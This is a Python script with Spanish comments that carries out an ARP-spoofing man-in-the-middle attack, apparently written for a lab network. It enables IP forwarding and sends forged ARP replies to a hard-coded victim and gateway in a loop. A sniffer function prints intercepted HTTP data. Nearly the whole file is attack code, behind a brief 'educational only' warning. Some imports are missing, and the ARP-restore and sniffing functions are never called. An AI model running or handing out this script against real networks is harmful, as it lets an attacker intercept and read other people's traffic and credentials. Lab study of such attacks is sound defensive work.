#!/usr/bin/env python3
"""
Script de Ataque ARP Spoofing (Man-in-the-Middle)
Envenena la tabla ARP de la victima para interceptar trafico
"""

from scapy.all import ARP, Ether, send, sniff, get_if_hwaddr
import time
import sys
import os

# Configuracion del ataque
VICTIM_IP = "192.168.1.10"
GATEWAY_IP = "192.168.1.1"
INTERFACE = "attacker-eth0"

def get_mac(ip):
    """
    Obtiene la MAC address de una IP usando ARP
    """
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
    except:
        pass
    return None

def enable_ip_forwarding():
    """
    Habilita IP forwarding para actuar como relay
    """
    print("[*] Habilitando IP forwarding...")
    os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")

def restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac):
    """
    Restaura las tablas ARP a su estado original
    """
    print("\n[*] Restaurando tablas ARP...")
    
    # Enviar ARP correcto a la victima
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, 
             psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
    
    # Enviar ARP correcto al gateway
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
             psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=False)
    
    print("[+] Tablas ARP restauradas")

def arp_spoof(victim_ip, gateway_ip):
    """
    Realiza el ataque ARP spoofing
    """
    print("\n" + "="*60)
    print("  ATAQUE ARP SPOOFING - MAN IN THE MIDDLE")
    print("="*60)
    print(f"\n[!] Objetivo: {victim_ip}")
    print(f"[!] Gateway: {gateway_ip}")
    print(f"[!] Interfaz: {INTERFACE}")
    
    # Obtener nuestra MAC
    attacker_mac = get_if_hwaddr(INTERFACE)
    print(f"[*] MAC del atacante: {attacker_mac}")
    
    # Habilitar IP forwarding
    enable_ip_forwarding()
    
    print("\n[*] Iniciando ARP spoofing...")
    print("[*] Presiona Ctrl+C para detener el ataque\n")
    
    packet_count = 0
    
    try:
        while True:
            # Envenenar cache ARP de la victima
            # Le decimos que nosotros somos el gateway
            arp_victim = ARP(op=2,  # ARP reply
                           pdst=victim_ip,  # IP destino: victima
                           hwdst="ff:ff:ff:ff:ff:ff",  # MAC destino: broadcast
                           psrc=gateway_ip,  # IP origen: gateway (FALSO)
                           hwsrc=attacker_mac)  # MAC origen: atacante
            
            # Envenenar cache ARP del gateway
            # Le decimos que nosotros somos la victima
            arp_gateway = ARP(op=2,  # ARP reply
                            pdst=gateway_ip,  # IP destino: gateway
                            hwdst="ff:ff:ff:ff:ff:ff",  # MAC destino: broadcast
                            psrc=victim_ip,  # IP origen: victima (FALSO)
                            hwsrc=attacker_mac)  # MAC origen: atacante
            
            # Enviar paquetes ARP envenenados
            send(arp_victim, verbose=False)
            send(arp_gateway, verbose=False)
            
            packet_count += 2
            
            print(f"\r[+] Paquetes ARP enviados: {packet_count}", end='', flush=True)
            
            time.sleep(2)  # Enviar cada 2 segundos
            
    except KeyboardInterrupt:
        print("\n\n[!] Ataque detenido por el usuario")
        print("[*] Limpiando...")
        
        # Restaurar ARPs (necesitariamos las MACs reales)
        # Por ahora solo informamos
        print("[!] IMPORTANTE: Limpiar cache ARP de la victima manualmente:")
        print(f"    victim# ip -s -s neigh flush all")
        print(f"    victim# arp -d {gateway_ip}")
        
        sys.exit(0)

def intercept_traffic():
    """
    Intercepta y muestra el trafico capturado
    """
    def packet_callback(packet):
        if packet.haslayer(Ether):
            src_mac = packet[Ether].src
            dst_mac = packet[Ether].dst
            
            # Solo mostrar trafico que pasa por nosotros
            if src_mac != get_if_hwaddr(INTERFACE) and dst_mac != get_if_hwaddr(INTERFACE):
                return
            
            if packet.haslayer(IP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                protocol = packet[IP].proto
                
                print(f"\n[INTERCEPTED] {src_ip} -> {dst_ip} (Protocol: {protocol})")
                
                # Mostrar datos HTTP si existen
                if packet.haslayer(Raw):
                    payload = packet[Raw].load
                    if b"HTTP" in payload or b"GET" in payload or b"POST" in payload:
                        print(f"[HTTP DATA] {payload[:100]}")
    
    print("\n[*] Iniciando captura de trafico interceptado...")
    sniff(iface=INTERFACE, prn=packet_callback, store=0)

if __name__ == "__main__":
    print("\n[WARNING] Este script es solo para propositos educativos")
    print("[WARNING] Usar ARP spoofing sin autorizacion es ILEGAL\n")
    
    if os.geteuid() != 0:
        print("[ERROR] Este script debe ejecutarse como root")
        sys.exit(1)
    
    try:
        arp_spoof(VICTIM_IP, GATEWAY_IP)
    except Exception as e:
        print(f"\n[ERROR] {e}")
        sys.exit(1)
